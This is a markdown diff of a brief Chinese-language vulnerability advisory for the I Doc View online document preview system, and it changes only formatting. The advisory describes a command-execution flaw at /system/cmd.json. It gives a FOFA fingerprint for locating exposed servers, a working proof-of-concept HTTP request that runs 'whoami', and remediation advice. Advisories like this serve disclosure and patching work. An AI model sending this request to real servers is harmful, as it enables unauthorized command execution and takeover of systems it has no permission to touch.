@@ -1,14 +1,14 @@
-####产品简介  
+###产品简介  
 i Doc View是一个在线文档解析应用，旨在提供便捷的文件查看和编辑服务。  
 
-####漏洞概述  
+###漏洞概述  
 iDocView是一个在线文档I Doc View在线文档预览系统cmd.json 处存在命令执行漏洞，攻击者可通过此漏洞获取服务器权限  
 
-####指纹识别  
+###指纹识别  
 fofa: title=="在线文档预览 - I Doc View"  
 
-####漏洞利用
-    poc:
+###漏洞利用
+```poc:
     GET /system/cmd.json?cmd=whoami HTTP/1.1
     Host: you_ip
     Upgrade-Insecure-Requests: 1
@@ -17,10 +17,11 @@ fofa: title=="在线文档预览 - I Doc View"
     Accept-Encoding: gzip, deflate
     Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
     Connection: close
+```
 
 
 
 
-####修复建议  
+###修复建议  
 1.联系相关软件厂商更新至最新安全版本。  
 2.临时屏蔽system/cmd.json接⼝  
